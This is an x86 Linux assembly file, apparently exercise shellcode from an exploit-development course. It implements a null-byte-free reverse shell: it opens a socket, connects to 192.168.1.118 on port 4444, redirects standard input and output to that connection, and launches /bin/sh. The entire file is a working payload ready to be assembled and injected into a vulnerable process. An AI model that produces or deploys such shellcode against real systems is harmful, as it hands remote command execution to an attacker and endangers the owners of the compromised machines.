; reverse.asm
; Paul Heneghan

global _start
section .text
    _start:
    ; clear regs so can use al, bl, etc... to avoid nulls!
    	xor		eax, eax
    	xor		ebx, ebx
    	xor		esi, esi	;going to use this to push nulls

    ; socket via socketcall
        mov     bl, 0x1  		; socketcall number 1
        						; int socket(int domain, int type, int protocol);
        push    esi 			; socket arg 3
        push    0x1 			; socket arg 2
        push    0x2				; socket arg 1
        mov     ecx, esp		; socketcall args
        mov     al, 0x66 		; system call number 66
        						;int socketcall(int call, unsigned long *args);
        int     0x80
        mov		edx, eax		; save sockfd for later
		
	; connect via socketcall
	    mov     bl, 0x3   		; socketcall number 3
	    						;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	    push	0x7601a8c0 				;ip addr = 192.168.1.118
	    push	word 	0x5c11			;port 115c = 4444
	    push	word	0x2				;family inet = 2
	    mov		ecx, esp
	    push	0x10			; bind arg 3
	    push	ecx 			; bind arg 2
	    push 	eax				; bind arg 1
	    mov     ecx, esp		; pointer to bind args
	    mov     al, 0x66 		; system call number 66
	    						;int socketcall(int call, unsigned long *args);
        int     0x80

	; dup2
	    xor 	ecx, ecx 		; clear down ecx to avoid nulls
duploop:
	    mov     al, 0x3f		; int dup2(int oldfd, int newfd);
	    int     0x80
		inc		ecx
		cmp ecx, 3
		jne duploop   ; it's okay - this generates a short jump :-)
		

	; execve
		mov al, 0xb			; int execve(const char *filename, char *const argv[], char *const envp[]);
		push esi
		push	0x68732f2f
		push	0x6e69622f
		mov ebx, esp
		xor ecx, ecx
		xor edx, edx
		int 0x80
		



